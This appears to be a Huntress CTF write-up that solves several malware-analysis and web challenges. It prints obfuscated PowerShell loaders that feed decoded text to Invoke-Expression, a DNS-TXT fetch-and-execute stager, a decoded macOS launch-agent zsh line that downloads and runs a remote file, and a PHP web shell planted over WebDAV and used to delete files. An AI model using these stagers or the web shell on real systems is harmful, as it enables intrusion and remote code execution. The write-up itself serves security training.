 ( nEW-ObjeCt  SYsTem.IO.comPreSsION.DefLAtEstrEaM( [sYSTEm.iO.MemOrYstreAM][COnveRt]::FRomBase64STRing('NZDdTsJAEEZfZUJIStUtJP4EMVxULMRENJEaEgiSdR1htbtbd4dKqX13W8DM7cn5ToZsDkUzHo27IfRhhMSmSj69faIgGE9CkcplvEareDIzGmNUKVpOG4vAHrlCl3KB0LDGUPtHyQawyFpjQ0HSaPCcTFBTkgujSeoNenAD8gNaTaypYGA2moDhN3R8KKB5ORo/TKuM1jM6k2TI7rSrVwCzWmNWwU6mwOI8RaAtwS8MjY24WLNjceVYBhOyUq8clP5x7KBlipNYg/c6ZyGbcbbrsOvT9uKkX3TOzsumVxfMJ7kjVEGMWwoiLcx7ZVr0ei/xsBtUzzmoW//YwOgMLVXA0Bp1yx1eXRyRw6jvV433OjNfyKJtatG5+i/l/sS+p4DyDw==' ) ,[io.cOMpreSSIoN.coMPrESsiOnMOde]::deCoMpRESs )|FoREaCH { nEW-ObjeCt Io.StreamReADER( $_, [sysTEM.texT.eNcOdinG]::Ascii ) }).reADTOEnD( ) | . ( $enV:CoMSpec[4,24,25]-jOin'')
PS C:\Users\root> ( nEW-ObjeCt  SYsTem.IO.comPreSsION.DefLAtEstrEaM( [sYSTEm.iO.MemOrYstreAM][COnveRt]::FRomBase64STRing('NZDdTsJAEEZfZUJIStUtJP4EMVxULMRENJEaEgiSdR1htbtbd4dKqX13W8DM7cn5ToZsDkUzHo27IfRhhMSmSj69faIgGE9CkcplvEareDIzGmNUKVpOG4vAHrlCl3KB0LDGUPtHyQawyFpjQ0HSaPCcTFBTkgujSeoNenAD8gNaTaypYGA2moDhN3R8KKB5ORo/TKuM1jM6k2TI7rSrVwCzWmNWwU6mwOI8RaAtwS8MjY24WLNjceVYBhOyUq8clP5x7KBlipNYg/c6ZyGbcbbrsOvT9uKkX3TOzsumVxfMJ7kjVEGMWwoiLcx7ZVr0ei/xsBtUzzmoW//YwOgMLVXA0Bp1yx1eXRyRw6jvV433OjNfyKJtatG5+i/l/sS+p4DyDw==' ) ,[io.cOMpreSSIoN.coMPrESsiOnMOde]::deCoMpRESs )|FoREaCH { nEW-ObjeCt Io.StreamReADER( $_, [sysTEM.texT.eNcOdinG]::Ascii ) }).reADTOEnD( )
try {$TGM8A = Get-WmiObject MSAcpi_ThermalZoneTemperature -Namespace "root/wmi" -ErrorAction 'silentlycontinue' ; if ($error.Count -eq 0) { $5GMLW = (Resolve-DnsName eventlog.zip -Type txt | ForEach-Object { $_.Strings }); if ($5GMLW -match '^[-A-Za-z0-9+/]*={0,3}$') { [System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String($5GMLW)) | Invoke-Expression } } } catch { }
PS C:\Users\root> $5GMLW = (Resolve-DnsName eventlog.zip -Type txt | ForEach-Object { $_.Strings });
PS C:\Users\root> echo $5GMLW
U3RhcnQtUHJvY2VzcyAiaHR0cHM6Ly95b3V0dS5iZS81NjFubmQ5RWJzcz90PTE2IgojZmxhZ3s0MDk1MzczNDdjMmZhZTAxZWY5ODI2YzI1MDZhYzY2MH0jCg==
```

I finally got the Base64 encoded string.

```console
PS C:\Users\root> $byte = [Convert]::FromBase64String("U3RhcnQtUHJvY2VzcyAiaHR0cHM6Ly95b3V0dS5iZS81NjFubmQ5RWJzcz90PTE2IgojZmxhZ3s0MDk1MzczNDdjMmZhZTAxZWY5ODI2YzI1MDZhYzY2MH0jCg==")
PS C:\Users\root> $txt = [System.Text.Encoding]::Default.GetString($byte);
PS C:\Users\root> echo $txt;
Start-Process "https://youtu.be/561nnd9Ebss?t=16"
#flag{409537347c2fae01ef9826c2506ac660}#
```

## Who is Real?

### Description

> This is not a technical challenge, but it is a good test of your eye!
>
> Now we live in a world of generative AI, for better or for worse. The fact of the matter is, threat actors can scheme up fake personas to lure you into a scam or social engineering... so, can you determine which profile picture is real and which is fake?
>
> Play a game to train yourself on identifying what stands out for AI generated people. After a streak of 10 correct selections, you'll receive the flag!
>
> Press the Start button on the top-right to begin this challenge.

### Flag

flag{10c0e4ed5fcc3259a1b0229264961590}

### Solution

solver.py

```python
"""
To get the flag, we need to select the non-AI-generated image from the two given images five times.

The correct choice is in cookie of response for / path.
Therefore, got the flag as the following step:

1. request to / path
2. parse "Cookie: session=eyJjb3J(snip)H0.ZTHJiQ.x2iHZfXJCHqECG803pSf6ZIxMjs" cookie.
   The correct choice is the first element which splited by `.`
3. request to /validate/{correct_answer}
4. return 1 and repeat 5 time
5. got flag
"""

import requests
import base64
import json
import re

s = requests.Session()
s.proxies = {"http": "http://127.0.0.1:8080"}

BASE_URL = "http://chal.ctf.games:31410"

resp = s.get(f"{BASE_URL}")
for _ in range(5):
    c = resp.cookies["session"].split(".")[0]
    correct_choice = base64.b64decode(c + "=" * (-len(c) % 4))
    correct_choice = json.loads(correct_choice)["correct_answer"]

    resp = s.get(f"{BASE_URL}/validate/{correct_choice}")

print(re.findall(r"flag{[0-9a-fA-F]{32}}", resp.text))
```

There is no need to implement script to automate this, as it only requires at most 5 attempts.

## Thumb Drive

### Description

> People say you shouldn't plug in USB drives! But I discovered this neat file on one that I found in the parking lot...
>
> WARNING: Your antivirus solution may raise an alert (this is the 'Malware' category, after all). Please do not attempt this challenge without the usual caution you may take when analyzing malicious software.
>
> Download the file(s) below.
>
> Attachments: ADATA_128GB.lnk

### Flag

flag{0af2873a74cfa957ccb90cef814cfe3}

### Solution

```console
root@kali:~/ctf/HuntressCTF# hd ADATA_128GB.lnk
(snip)
00000630  00 4d 00 44 00 3c 00 68  00 74 00 74 00 70 00 73  |.M.D.<.h.t.t.p.s|
00000640  00 3a 00 2f 00 2f 00 74  00 69 00 6e 00 79 00 75  |.:././.t.i.n.y.u|
00000650  00 72 00 6c 00 2e 00 63  00 6f 00 6d 00 2f 00 61  |.r.l...c.o.m./.a|
00000660  00 37 00 62 00 61 00 36  00 6d 00 61 00 00 00 00  |.7.b.a.6.m.a....|
```

There is <https://tinyurl.com/a7ba6ma> URL, and Looking at it.
This is Google Drive link and there is `usb.txt` text file.

```console
root@kali:~/ctf/HuntressCTF# cat usb.txt | fold -w1 | sort -u | tr -d '\n'
=234567ABCDEFGHIJKLMNOPQRSTUVWXYZ
```

`usb.txt` is Base32 encoded text and decode it.

```console
root@kali:~/ctf/HuntressCTF# cat usb.txt | base32 -d > test.exe

root@kali:~/ctf/HuntressCTF# file test.exe
test.exe: PE32 executable (DLL) (GUI) Intel 80386, for MS Windows, 5 sections
```

This is PE32 executable (32 bit), but I couldn't execute it binary in Windows 10 and also Wine in Kali.

```console
root@kali:~/ctf/HuntressCTF# wine test.exe
Application could not be started, or no application associated with the specified file.
ShellExecuteEx failed: File not found.
```

I will try to Static Analysis.

<details><summary>_MessageBoxThread@4 function decompiled with Ghidra</summary>

```c
void _MessageBoxThread@4(void)

{
  uint uVar1;
  undefined4 local_160;
  undefined4 auStack_15c [4];
  undefined4 uStack_14c;
  undefined4 uStack_148;
  undefined4 uStack_144;
  undefined4 local_140;
  undefined4 uStack_13c;
  undefined4 uStack_138;
  undefined4 uStack_134;
  undefined4 local_130;
  undefined4 uStack_12c;
  undefined4 uStack_128;
  undefined4 uStack_124;
  undefined4 local_120;
  undefined4 uStack_11c;
  undefined4 uStack_118;
  undefined4 uStack_114;
  undefined4 local_110;
  undefined4 uStack_10c;
  undefined4 uStack_108;
  undefined4 uStack_104;
  undefined4 local_100;
  undefined4 uStack_fc;
  undefined4 uStack_f8;
  undefined4 uStack_f4;
  undefined4 local_f0;
  undefined4 uStack_ec;
  undefined4 uStack_e8;
  undefined4 uStack_e4;
  undefined4 local_e0;
  undefined4 uStack_dc;
  undefined4 uStack_d8;
  undefined4 uStack_d4;
  undefined4 local_d0;
  undefined4 local_cc;
  undefined4 local_c8;
  undefined4 auStack_c4 [4];
  undefined4 uStack_b4;
  undefined4 uStack_b0;
  undefined4 uStack_ac;
  undefined4 local_a8;
  undefined4 uStack_a4;
  undefined4 uStack_a0;
  undefined4 uStack_9c;
  undefined4 local_98;
  undefined4 uStack_94;
  undefined4 uStack_90;
  undefined4 uStack_8c;
  undefined4 local_88;
  undefined4 uStack_84;
  undefined4 uStack_80;
  undefined4 uStack_7c;
  undefined4 local_78;
  undefined4 uStack_74;
  undefined4 uStack_70;
  undefined4 uStack_6c;
  undefined4 local_68;
  undefined4 uStack_64;
  undefined4 uStack_60;
  undefined4 uStack_5c;
  undefined4 local_58;
  undefined4 uStack_54;
  undefined4 uStack_50;
  undefined4 uStack_4c;
  undefined4 local_48;
  undefined4 uStack_44;
  undefined4 uStack_40;
  undefined4 uStack_3c;
  undefined4 local_38;
  undefined4 local_34;
  byte local_30 [40];
  uint local_8;

                    /* 0x1000  2  _MessageBoxThread@4 */
  local_8 = DAT_10003004 ^ (uint)&stack0xfffffffc;
  uVar1 = 0;
  local_160 = 0x84;
  auStack_15c[0] = 0xc6;
  auStack_15c[1] = 0xbd;
  auStack_15c[2] = 0xbf;
  local_d0 = 0x33;
  auStack_15c[3] = 0xa8;
  uStack_14c = 0xd9;
  uStack_148 = 0x91;
  uStack_144 = 0x6d;
  local_cc = 0x26;
  local_140 = 8;
  uStack_13c = 0xb;
  uStack_138 = 0x4b;
  uStack_134 = 0xe6;
  local_38 = 0x57;
  local_130 = 0xb3;
  uStack_12c = 0xcb;
  uStack_128 = 0x92;
  uStack_124 = 0xde;
  local_34 = 0x5b;
  local_120 = 0xa1;
  uStack_11c = 100;
  uStack_118 = 0xdf;
  uStack_114 = 0xf5;
  local_110 = 0x9c;
  uStack_10c = 0x75;
  uStack_108 = 7;
  uStack_104 = 0xc6;
  local_100 = 0x35;
  uStack_fc = 0x10;
  uStack_f8 = 0xf7;
  uStack_f4 = 0x5d;
  local_f0 = 0x98;
  uStack_ec = 0x56;
  uStack_e8 = 0x8a;
  uStack_e4 = 0x16;
  local_e0 = 0x28;
  uStack_dc = 8;
  uStack_d8 = 0x69;
  uStack_d4 = 0x9b;
  local_c8 = 0xe2;
  auStack_c4[0] = 0xaa;
  auStack_c4[1] = 0xdc;
  auStack_c4[2] = 0xd8;
  auStack_c4[3] = 0xd3;
  uStack_b4 = 0xe9;
  uStack_b0 = 0xf0;
  uStack_ac = 0xb;
  local_a8 = 0x3a;
  uStack_a4 = 0x33;
  uStack_a0 = 0x7c;
  uStack_9c = 0xd5;
  local_98 = 0xd2;
  uStack_94 = 0xfc;
  uStack_90 = 0xa6;
  uStack_8c = 0xbd;
  local_88 = 199;
  uStack_84 = 5;
  uStack_80 = 0xe6;
  uStack_7c = 0xc0;
  local_78 = 0xab;
  uStack_74 = 0x16;
  uStack_70 = 100;
  uStack_6c = 0xa4;
  local_68 = 0xc;
  uStack_64 = 0x20;
  uStack_60 = 0x94;
  uStack_5c = 0x38;
  local_58 = 0xfe;
  uStack_54 = 0x6e;
  uStack_50 = 0xbb;
  uStack_4c = 0x22;
  local_48 = 0x4b;
  uStack_44 = 0x6e;
  uStack_40 = 0xc;
  uStack_3c = 0xa8;
  do {
    local_30[uVar1] = *(byte *)(&local_c8 + uVar1) ^ *(byte *)(&local_160 + uVar1);
    local_30[uVar1 + 1] = *(byte *)(auStack_c4 + uVar1) ^ *(byte *)(auStack_15c + uVar1);
    uVar1 = uVar1 + 2;
  } while (uVar1 < 0x26);
  MessageBoxA((HWND)0x0,(LPCSTR)local_30,"Your flag is:",0);
  FUN_100011b7(local_8 ^ (uint)&stack0xfffffffc);
  return;
}
```

</details>

flag is XORed.

Note: variable order

```python
>>> d1 = [0x84, 0xc6, 0xbd, 0xbf, 0xa8, 0xd9, 0x91, 0x6d, 8, 0xb, 0x4b, 0xe6, 0xb3, 0xcb, 0x92, 0xde, 0xa1, 100, 0xdf, 0xf5, 0x9c, 0x75, 7, 0xc6, 0x35, 0x10, 0xf7, 0x5d, 0x98, 0x56, 0x8a, 0x16, 0x28, 8, 0x69, 0x9b, 0x33, 0x26]
>>> d2 = [0xe2, 0xaa, 0xdc, 0xd8, 0xd3, 0xe9, 0xf0, 0xb, 0x3a, 0x33, 0x7c, 0xd5, 0xd2, 0xfc, 0xa6, 0xbd, 199, 5, 0xe6, 0xc0, 0xab, 0x16, 100, 0xa4, 0xc, 0x20, 0x94, 0x38, 0xfe, 0x6e, 0xbb, 0x22, 0x4b, 0x6e, 0xc, 0xa8, 0x57, 0x5b]
>>> ''.join([chr(x1^x2) for x1, x2 in zip(d1, d2)])
'flag{0af2873a74cfa957ccb90cef814cfe3d}'
```

## Operation Eradication

### Description

> Oh no! A ransomware operator encrypted an environment, and exfiltrated data that they will soon use for blackmail and extortion if they don't receive payment! They stole our data!
>
> Luckily, we found what looks like a configuration file, that seems to have credentials to the actor's storage server... but it doesn't seem to work. Can you get onto their server and delete all the data they stole!?
>
> Download the file(s) below and press the Start button on the top-right to begin this challenge.
>
> Attachments: operation_eradication

### Flag

flag{564607375b731174f2c08c5bf16e82b4}

### Solution

Useful tools: [Rclone](https://rclone.org/)

The attached `operation_eradication` file is the following:

```text
type = webdav
url = http://localhost/webdav
vendor = other
user = VAHycYhK2aw9TNFGSpMf1b_2ZNnZuANcI8-26awGLYkwRzJwP_buNsZ1eQwRkmjQmVzxMe5r
pass = HOUg3Z2KV2xlQpUfj6CYLLqCspvexpRXU9v8EGBFHq543ySEoZE9YSdH7t8je5rWfBIIMS-5
```

Modified `~/.config/rclone/rclone.conf` for rclone config file:

~/.config/rclone/rclone.conf

```init
[test]
type = webdav
url = http://chal.ctf.games:30870/webdav
vendor = other
user = VAHycYhK2aw9TNFGSpMf1b_2ZNnZuANcI8-26awGLYkwRzJwP_buNsZ1eQwRkmjQmVzxMe5r
pass = HOUg3Z2KV2xlQpUfj6CYLLqCspvexpRXU9v8EGBFHq543ySEoZE9YSdH7t8je5rWfBIIMS-5
```

Then, mount it

```bash
mkdir -p mnt
rclone mount test:/ ./mnt
```

Opened another terminal, uploaded test.php to `mnt` directory, executed it.
test.php is the PHP code to write ``<?=`$_GET[0]`?>`` to ../shell.php.

```console
root@kali:~/ctf/HuntressCTF/mnt# echo -ne '<?=`$_GET[0]`?>' | base64
PD89YCRfR0VUWzBdYD8+

root@kali:~/ctf/HuntressCTF/mnt# echo -ne '<?php $myfile = fopen("../shell.php", "w") or die("Unable to open file!"); $txt = base64_decode("PD89YCRfR0VUWzBdYD8+"); fwrite($myfile, $txt); fclose($myfile); ?>' > test.php

root@kali:~/ctf/HuntressCTF/mnt# curl http://chal.ctf.games:30870/shell.php  # see if shell.php is generated
<!DOCTYPE HTML PUBLIC "-//IETF//DTD HTML 2.0//EN">
<html><head>
<title>404 Not Found</title>
</head><body>
<h1>Not Found</h1>
<p>The requested URL was not found on this server.</p>
<hr>
<address>Apache/2.4.54 (Debian) Server at chal.ctf.games Port 30870</address>
</body></html>

root@kali:~/ctf/HuntressCTF/mnt# cat test.php  # execute test.php
(snip)
root@kali:~/ctf/HuntressCTF/mnt# curl http://chal.ctf.games:30870/shell.php  # see if shell.php is generated
<br />
<b>Warning</b>:  shell_exec(): Cannot execute a blank command in <b>/var/www/html/shell.php</b> on line <b>1</b><br />

root@kali:~/ctf/HuntressCTF/mnt# curl http://chal.ctf.games:30870/shell.php?0=ls
index.php
shell.php
webdav

root@kali:~/ctf/HuntressCTF/mnt# curl -G 'http://chal.ctf.games:30870/shell.php' --data-urlencode "0=rm -fr webdav"

root@kali:~/ctf/HuntressCTF/mnt# curl -s http://chal.ctf.games:30870/ | grep -oE 'flag{[0-9a-z]{32}}'
flag{564607375b731174f2c08c5bf16e82b4}
```

## Speakfriend

### Description

> It seems like this website was compromised. We found this file that seems to be related... can you make any sense of these and uncover a flag?
>
> NOTE:
>
> - Archive password is infected
> - You will need access this service with HTTPS. Please use https:// as the URL schema rather than plain http://.
> - This website uses a self-signed certificate. The "Warning: connection not secure" message is expected and intended. You can continue on to the website.
> - This challenge is based off of a real malware sample. We have done our best to "defang" the code, but out of abundance of caution it is strongly encouraged you only analyze this inside of a virtual environment separate from any production devices.
>
>
> Press the Start button on the top-right to begin this challenge.
> Attachments: main.7z

### Flag

flag{3f2567475c6def39501bab2865aeba60}

### Solution

The `main` executable executes cURL with the user agent `Mozilla/5.0 93bed45b-7b70-4097-9279-98a4aef0353e` against the URL passed as an argument.

1. Listen 80 port `nc -lnvp 80`
2. Execute `main` binary: `./main http://localhost`
3. Looking at `nc` output:

   ```console
   root@kali:~/ctf/HuntressCTF# nc -lnvp 80
   listening on [any] 80 ...
   connect to [127.0.0.1] from (UNKNOWN) [127.0.0.1] 38276
   GET / HTTP/1.1
   Host: localhost
   User-Agent: Mozilla/5.0 93bed45b-7b70-4097-9279-98a4aef0353e
   Accept: */*
   ```

Also, we can find this user agent compiled with Ghidra.

main function decompiled with Ghidra:

```c
    local_1c8 = 0x2f616c6c697a6f4d;
    local_1c0 = 0x6562333920302e35;
    local_1b8 = 0x3762372d62353464;
    local_1b0 = 0x392d373930342d30;
    local_1a8 = 0x346138392d393732;
    local_1a0 = 0x6533353330666561;
    local_198[0] = '\0';
```

```python
>>> from pwn import p64
>>> b''.join([p64(0x2f616c6c697a6f4d), p64(0x6562333920302e35), p64(0x3762372d62353464), p64(0x392d373930342d30), p64(0x346138392d393732), p64(0x6533353330666561)])
b'Mozilla/5.0 93bed45b-7b70-4097-9279-98a4aef0353e'
```

Got flag:

```console
root@kali:~/ctf/HuntressCTF# curl -kL -A 'Mozilla/5.0 93bed45b-7b70-4097-9279-98a4aef0353e' https://chal.ctf.games:30842
flag{3f2567475c6def39501bab2865aeba60}
```

## Welcome to the Park

### Description

> The creator of Jurassic Park is in hiding... amongst Mach-O files, apparently. Can you find him?
>
> Download the file(s) below.
>
> Attachment: welcomeToThePark.zip

### Flag

flag{680b736565c76941a364775f06383466}

### Solution

- Extracted attached zip file, I found interesting file: `welcome/.hidden/welcomeToThePark`
- Got Base64 encoded string by `strings` command and decode it, got XML
- Found obfuscated zsh code and decode it, got URL: <https://gist.github.com/stuartjash/a7d187c44f4327739b752d037be45f01>
- Downloaded image file
- Got flag by `strings` command

```console
root@kali:~/ctf/HuntressCTF# strings welcome/.hidden/welcomeToThePark
__PAGEZERO
__TEXT
__text
__TEXT
__stubs
__TEXT
__cstring
__TEXT
__unwind_info
__TEXT
__DATA_CONST
__got
__DATA_CONST
__LINKEDIT
/usr/lib/dyld
/usr/lib/libSystem.B.dylib
PD94bWwgdmVyc2lvbj0iMS4wIiBlbmNvZGluZz0iVVRGLTgiPz48IURPQ1RZUEUgcGxpc3QgUFVCTElDICItLy9BcHBsZS8vRFREIFBMSVNUIDEuMC8vRU4iICJodHRwOi8vd3d3LmFwcGxlLmNvbS9EVERzL1Byb3BlcnR5TGlzdC0xLjAuZHRkIj48cGxpc3QgdmVyc2lvbj0iMS4wIj48ZGljdD48a2V5PkxhYmVsPC9rZXk+PHN0cmluZz5jb20uaHVudHJlc3MuY3RmPC9zdHJpbmc+PGtleT5Qcm9ncmFtQXJndW1lbnRzPC9rZXk+PGFycmF5PjxzdHJpbmc+L2Jpbi96c2g8L3N0cmluZz48c3RyaW5nPi1jPC9zdHJpbmc+PHN0cmluZz5BMGI9J3RtcD0iJChtJztBMGJFUmhlWj0na3RlbXAgL3RtcC9YWCc7QTBiRVJoZVpYPSdYWFhYWFgpIic7QTBiRVI9JzsgY3VybCAtLSc7QTBiRT0ncmV0cnkgNSAtZiAnO0EwYkVSaD0nImh0dHBzOi8vJztBMGJFUmhlWlhEUmk9J2dpc3QuZ2l0aHUnO3hiRVI9J2IuY29tL3MnO2p1dVE9J3R1YXJ0amFzJztqdXVRUTdsN1g1PSdoL2E3ZDE4JztqdXVRUTdsN1g1eVg9JzdjNDRmNDMyNyc7anV1UVE3bDdYNXk9JzczOWI3NTJkMDM3YmU0NWYwMSc7anV1UVE3PSciIC1vICIke3RtcH0iOyBpJztqdXVRUTdsNz0nZiBbWyAtcyAiJHt0bXB9JztqdXVRUTdsN1g9JyIgXV07JztqdVFRN2w3WDV5PScgdGhlbiBjaG0nO2p1UVE3bD0nb2QgNzc3ICIke3RtcH0iOyAnO3pSTzNPVXRjWHQ9JyIke3RtcH0iJzt6Uk8zT1V0PSc7IGZpOyBybSc7elJPM09VdGNYdGVCPScgIiR7dG1wfSInO2VjaG8gLWUgJHtBMGJ9JHtBMGJFUmhlWn0ke0EwYkVSaGVaWH0ke0EwYkVSfSR7QTBiRX0ke0EwYkVSaH0ke0EwYkVSaGVaWERSaX0ke3hiRVJ9JHtqdXVRfSR7anV1UVE3bDdYNX0ke2p1dVFRN2w3WDV5WH0ke2p1dVFRN2w3WDV5fSR7anV1UVE3fSR7anV1UVE3bDd9JHtqdXVRUTdsN1h9JHtqdVFRN2w3WDV5fSR7anVRUTdsfSR7elJPM09VdGNYdH0ke3pSTzNPVXR9JHt6Uk8zT1V0Y1h0ZUJ9IHwgL2Jpbi96c2g8L3N0cmluZz48L2FycmF5PjxrZXk+UnVuQXRMb2FkPC9rZXk+PHRydWUgLz48a2V5PlN0YXJ0SW50ZXJ2YWw8L2tleT48aW50ZWdlcj4xNDQwMDwvaW50ZWdlcj48L2RpY3Q+PC9wbGlzdD4=
Hello World!
___stack_chk_fail
___stack_chk_guard
_memcpy
_printf
_mh_execute_header
        main
__mh_execute_header
_main
___stack_chk_fail
___stack_chk_guard
_memcpy
_printf
a.out
!U[


root@kali:~/ctf/HuntressCTF# B64=PD94bWwgdmVyc2lvbj0iMS4wIiBlbmNvZGluZz0iVVRGLTgiPz48IURPQ1RZUEUgcGxpc3QgUFVCTElDICItLy9BcHBsZS8vRFREIFBMSVNUIDEuMC8vRU4iICJodHRwOi8vd3d3LmFwcGxlLmNvbS9EVERzL1Byb3BlcnR5TGlzdC0xLjAuZHRkIj48cGxpc3QgdmVyc2lvbj0iMS4wIj48ZGljdD48a2V5PkxhYmVsPC9rZXk+PHN0cmluZz5jb20uaHVudHJlc3MuY3RmPC9zdHJpbmc+PGtleT5Qcm9ncmFtQXJndW1lbnRzPC9rZXk+PGFycmF5PjxzdHJpbmc+L2Jpbi96c2g8L3N0cmluZz48c3RyaW5nPi1jPC9zdHJpbmc+PHN0cmluZz5BMGI9J3RtcD0iJChtJztBMGJFUmhlWj0na3RlbXAgL3RtcC9YWCc7QTBiRVJoZVpYPSdYWFhYWFgpIic7QTBiRVI9JzsgY3VybCAtLSc7QTBiRT0ncmV0cnkgNSAtZiAnO0EwYkVSaD0nImh0dHBzOi8vJztBMGJFUmhlWlhEUmk9J2dpc3QuZ2l0aHUnO3hiRVI9J2IuY29tL3MnO2p1dVE9J3R1YXJ0amFzJztqdXVRUTdsN1g1PSdoL2E3ZDE4JztqdXVRUTdsN1g1eVg9JzdjNDRmNDMyNyc7anV1UVE3bDdYNXk9JzczOWI3NTJkMDM3YmU0NWYwMSc7anV1UVE3PSciIC1vICIke3RtcH0iOyBpJztqdXVRUTdsNz0nZiBbWyAtcyAiJHt0bXB9JztqdXVRUTdsN1g9JyIgXV07JztqdVFRN2w3WDV5PScgdGhlbiBjaG0nO2p1UVE3bD0nb2QgNzc3ICIke3RtcH0iOyAnO3pSTzNPVXRjWHQ9JyIke3RtcH0iJzt6Uk8zT1V0PSc7IGZpOyBybSc7elJPM09VdGNYdGVCPScgIiR7dG1wfSInO2VjaG8gLWUgJHtBMGJ9JHtBMGJFUmhlWn0ke0EwYkVSaGVaWH0ke0EwYkVSfSR7QTBiRX0ke0EwYkVSaH0ke0EwYkVSaGVaWERSaX0ke3hiRVJ9JHtqdXVRfSR7anV1UVE3bDdYNX0ke2p1dVFRN2w3WDV5WH0ke2p1dVFRN2w3WDV5fSR7anV1UVE3fSR7anV1UVE3bDd9JHtqdXVRUTdsN1h9JHtqdVFRN2w3WDV5fSR7anVRUTdsfSR7elJPM09VdGNYdH0ke3pSTzNPVXR9JHt6Uk8zT1V0Y1h0ZUJ9IHwgL2Jpbi96c2g8L3N0cmluZz48L2FycmF5PjxrZXk+UnVuQXRMb2FkPC9rZXk+PHRydWUgLz48a2V5PlN0YXJ0SW50ZXJ2YWw8L2tleT48aW50ZWdlcj4xNDQwMDwvaW50ZWdlcj48L2RpY3Q+PC9wbGlzdD4=

root@kali:~/ctf/HuntressCTF# echo ${B64} | base64 -d | xq
{
  "plist": {
    "@version": "1.0",
    "dict": {
      "key": [
        "Label",
        "ProgramArguments",
        "RunAtLoad",
        "StartInterval"
      ],
      "string": "com.huntress.ctf",
      "array": {
        "string": [
          "/bin/zsh",
          "-c",
          "A0b='tmp=\"$(m';A0bERheZ='ktemp /tmp/XX';A0bERheZX='XXXXXX)\"';A0bER='; curl --';A0bE='retry 5 -f ';A0bERh='\"https://';A0bERheZXDRi='gist.githu';xbER='b.com/s';juuQ='tuartjas';juuQQ7l7X5='h/a7d18';juuQQ7l7X5yX='7c44f4327';juuQQ7l7X5y='739b752d037be45f01';juuQQ7='\" -o \"${tmp}\"; i';juuQQ7l7='f [[ -s \"${tmp}';juuQQ7l7X='\" ]];';juQQ7l7X5y=' then chm';juQQ7l='od 777 \"${tmp}\"; ';zRO3OUtcXt='\"${tmp}\"';zRO3OUt='; fi; rm';zRO3OUtcXteB=' \"${tmp}\"';echo -e ${A0b}${A0bERheZ}${A0bERheZX}${A0bER}${A0bE}${A0bERh}${A0bERheZXDRi}${xbER}${juuQ}${juuQQ7l7X5}${juuQQ7l7X5yX}${juuQQ7l7X5y}${juuQQ7}${juuQQ7l7}${juuQQ7l7X}${juQQ7l7X5y}${juQQ7l}${zRO3OUtcXt}${zRO3OUt}${zRO3OUtcXteB} | /bin/zsh"
        ]
      },
      "true": null,
      "integer": "14400"
    }
  }
}

root@kali:~/ctf/HuntressCTF# A0b='tmp=\"$(m';A0bERheZ='ktemp /tmp/XX';A0bERheZX='XXXXXX)\"';A0bER='; curl --';A0bE='retry 5 -f ';A0bERh='\"https://';A0bERheZXDRi='gist.githu';xbER='b.com/s';juuQ='tuartjas';juuQQ7l7X5='h/a7d18';juuQQ7l7X5yX='7c44f4327';juuQQ7l7X5y='739b752d037be45f01';juuQQ7='\" -o \"${tmp}\"; i';juuQQ7l7='f [[ -s \"${tmp}';juuQQ7l7X='\" ]];';juQQ7l7X5y=' then chm';juQQ7l='od 777 \"${tmp}\"; ';zRO3OUtcXt='\"${tmp}\"';zRO3OUt='; fi; rm';zRO3OUtcXteB=' \"${tmp}\"';echo -e ${A0b}${A0bERheZ}${A0bERheZX}${A0bER}${A0bE}${A0bERh}${A0bERheZXDRi}${xbER}${juuQ}${juuQQ7l7X5}${juuQQ7l7X5yX}${juuQQ7l7X5y}${juuQQ7}${juuQQ7l7}${juuQQ7l7X}${juQQ7l7X5y}${juQQ7l}${zRO3OUtcXt}${zRO3OUt}${zRO3OUtcXteB}
tmp=\"$(mktemp /tmp/XXXXXXXX)\"; curl --retry 5 -f \"https://gist.github.com/stuartjash/a7d187c44f4327739b752d037be45f01\" -o \"${tmp}\"; if [[ -s \"${tmp}\" ]]; then chmod 777 \"${tmp}\"; \"${tmp}\"; fi; rm \"${tmp}\"

root@kali:~/ctf/HuntressCTF# # access https://gist.github.com/stuartjash/a7d187c44f4327739b752d037be45f01 and download JohnHammond.jpg image file

root@kali:~/ctf/HuntressCTF# mv ~/Downloads/JohnHammond.jpg .

root@kali:~/ctf/HuntressCTF# file JohnHammond.jpg
JohnHammond.jpg: JPEG image data, JFIF standard 1.01, resolution (DPI), density 96x96, segment length 16, baseline, precision 8, 484x445, components 3

root@kali:~/ctf/HuntressCTF# strings JohnHammond.jpg | grep flag
; flag{680b736565c76941a364775f06383466}
```

## Snake Oil

### Description

> One of our workstations was exhibiting strange network communications... we found this binary that looked to be the culprit. Can you find anything suspicious?
>
> Download the file(s) below.
>
> Attachments: snake-oil

### Flag

flag{d7267ce26203b5cc69f4bab679cc78d2}

### Solution

Useful tools for this challenge:

- [extremecoders-re/pyinstxtractor: PyInstaller Extractor](https://github.com/extremecoders-re/pyinstxtractor)
- [zrax/pycdc: C++ python bytecode disassembler and decompiler](https://github.com/zrax/pycdc)

```console
root@kali:~/ctf/HuntressCTF# file snake-oil
snake-oil: PE32+ executable (console) x86-64, for MS Windows, 7 sections
```

The attached snake-oil file is PE32+ executable.
I decompiled snake-oil with Ghidra and found icon generated with PyInstaller.

![snake-oil_pyinstaller_detection.png](img/snake-oil_pyinstaller_detection.png)

I used [pyinstxtractor](https://github.com/extremecoders-re/pyinstxtractor) for Reverse Engineering.

```bash
git clone https://github.com/extremecoders-re/pyinstxtractor.git
python3 pyinstxtractor/pyinstxtractor.py ./snake-oil
```

Found the unfamiliar file `brain-melt.pyc`.

```console
root@kali:~/ctf/HuntressCTF# file snake-oil_extracted/brain-melt.pyc
snake-oil_extracted/brain-melt.pyc: Byte-compiled Python module for CPython 3.9, timestamp-based, .py timestamp: Thu Jan  1 00:00:00 1970 UTC, .py size: 0 bytes
```

I used [pycdc](https://github.com/zrax/pycdc) to decompile this pyc file.
(FYI: [uncompyle6](https://github.com/rocky/python-uncompyle6/tree/e9120eab45801782fbf645fbf2b7235aac046574) is not working for this pyc. I guess because of Python 3.9.)

```bash
# Setup for pycdc
git clone https://github.com/zrax/pycdc.git
mkdir pycdc_build && cd $_
cmake ../pycdc/
make

# Decompile
./pycdc ../snake-oil_extracted/brain-melt.pyc
```

output:

```python
# (snip)
def decrypt(s1, s2):
    return ''.join((lambda .0: [ chr(ord(c1) ^ ord(c2)) for c1, c2 in .0 ])(zip(s1, s2)))


def deobfuscate():
    part1 = '2ec7627d{galf'[::-1]
    part2 = str(base64.b64decode('NjIwM2I1Y2M2OWY0'.encode('ascii')), 'UTF8')
    part3 = decrypt('\x17*\x07`BC\x14*R@\x14^*', 'uKeVuzwIexplW')
    key = part1 + part2 + part3
    return key
# (snip)
```

